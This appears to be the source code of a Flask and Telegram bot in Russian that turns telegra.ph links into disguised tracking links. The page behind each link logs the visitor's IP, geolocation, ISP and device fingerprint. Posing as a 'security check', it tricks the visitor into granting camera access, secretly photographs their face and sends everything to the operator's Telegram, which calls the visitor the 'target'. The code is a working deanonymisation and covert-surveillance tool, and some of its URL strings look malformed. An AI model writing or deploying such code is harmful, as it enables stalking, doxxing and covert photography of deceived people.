import telebot
import requests
import os
from flask import Flask, request, jsonify

API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/')
def index():
    return '<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;"><a href="/setup-my-bot-secret" style="color:#0088cc;text-decoration:none;font-family:sans-serif;font-weight:bold;border:2px solid #0088cc;padding:10px 20px;border-radius:10px;">ACTIVATE SYSTEM</a></body>'

@app.route('/setup-my-bot-secret')
def setup_webhook():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "SYSTEM ONLINE"
    return "ERROR"

@app.route('/v/<path:article_id>')
def logger(article_id):
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    ua = request.headers.get('user-agent')
    
    geo = "📍 Данные GeoIP недоступны"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query&lang=ru", timeout=5).json()
        if r.get('status') == 'success':
            geo = (f"🌍 *Место:* {r.get('country')}, {r.get('city')} ({r.get('regionName')})\n"
                   f"📮 *Индекс:* `{r.get('zip')}`\n"
                   f"📡 *Провайдер:* `{r.get('isp')}`\n"
                   f"🕵️ *VPN/Proxy:* `{'ДА' if r.get('proxy') else 'НЕТ'}`\n"
                   f"⏰ *Время:* `{r.get('timezone')}`")
    except: pass

    bot.send_message(ADMIN_ID, f"🎯 *НОВЫЙ ТАРГЕТ!*\n\n👤 *IP:* `{ip}`\n{geo}\n📱 *UA:* `{ua}`", parse_mode="Markdown")
    
    return f'''
    <html>
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"></head>
    <body style="background:#000;color:white;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;">
        <div id="ui">
            <div style="font-size:60px;margin-bottom:20px;">🛡️</div>
            <h2 style="margin:0 0 10px 0;">Проверка безопасности</h2>
            <p style="color:#888;margin-bottom:30px;padding:0 30px;">Нажмите кнопку ниже для подтверждения личности</p>
            <button id="go" style="padding:18px 50px;border:none;border-radius:15px;background:#fff;color:#000;font-weight:700;font-size:16px;cursor:pointer;transition:0.3s;">ПОДТВЕРДИТЬ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('go');
        btn.onclick = async () => {{
            btn.style.opacity = "0.5";
            btn.innerText = "Синхронизация...";
            
            let data = {{
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                scr: window.screen.width + "x" + window.screen.height + " (DPR: " + window.devicePixelRatio + ")",
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language,
                touch: navigator.maxTouchPoints,
                gpu: "N/A",
                pdf: navigator.pdfViewerEnabled,
                dark: window.matchMedia('(prefers-color-scheme: dark)').matches
            }};

            try {{
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                let debug = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}

            await fetch('/log_extra', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg');
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "https://telegra.ph{article_id}";
                        }});
                    }}, 'image/jpeg', 0.8);
                }}, 1000);
            } catch(e) {{
                window.location.href = "https://telegra.ph{article_id}";
            }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    msg = (f"🖥 *ТЕХНИЧЕСКИЕ ДАННЫЕ*\n\n"
           f"🧠 Ядра ЦП: `{d.get('cores')}`\n"
           f"💾 ОЗУ: `{d.get('ram')} GB`\n"
           f"📺 Экран: `{d.get('scr')}`\n"
           f"🎮 Видеокарта: `{d.get('gpu')}`\n"
           f"🖐 Touch-точки: `{d.get('touch')}`\n"
           f"🌓 Темная тема: `{'ДА' if d.get('dark') else 'НЕТ'}`\n"
           f"📑 PDF Support: `{'ДА' if d.get('pdf') else 'НЕТ'}`\n"
           f"🌐 Язык: `{d.get('lang')}`\n"
           f"🕒 Часовой пояс: `{d.get('tz')}`")
    bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    file = request.files.get('photo')
    if file: bot.send_photo(ADMIN_ID, file.read(), caption="📸 ЛИЦО ЦЕЛИ")
    return "ok"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_message():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Пришли ссылку на Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1].strip()
    bot.send_message(message.chat.id, f"✅ Твоя имба-ссылка:\n`https://{request.host}/v/{path}`", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
